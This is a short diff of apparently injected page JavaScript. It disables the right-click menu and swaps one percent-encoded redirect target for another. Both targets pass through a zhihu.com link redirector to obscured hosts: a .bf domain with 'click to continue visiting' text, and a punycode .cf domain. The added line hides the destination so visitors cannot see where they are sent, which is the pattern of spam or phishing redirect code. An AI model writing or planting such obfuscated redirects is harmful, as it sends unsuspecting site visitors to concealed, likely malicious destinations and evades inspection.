@@ -17,7 +17,7 @@ setInterval(function () {
 
 
 document.oncontextmenu = function () { return false; };    
- var x='https://link.zhihu.com/?target=https://%34%6b%2e%73%75%6f%6f%2e%62%66/?%E7%82%B9%E5%87%BB%E7%BB%A7%E7%BB%AD%E8%AE%BF%E9%97%AE';
+ var x='https://link.zhihu.com/?target=https://%78%6e%2d%2d%38%39%71%35%32%36%65%67%78%6a%79%61%34%32%35%6e%71%6a%61%6d%39%30%64%2e%64%61%6c%6f%6e%67%2e%63%66/';
     $(function () {
         let u = window.document.location.href.toString().split("?");
         if (typeof (u[1]) == "string") {
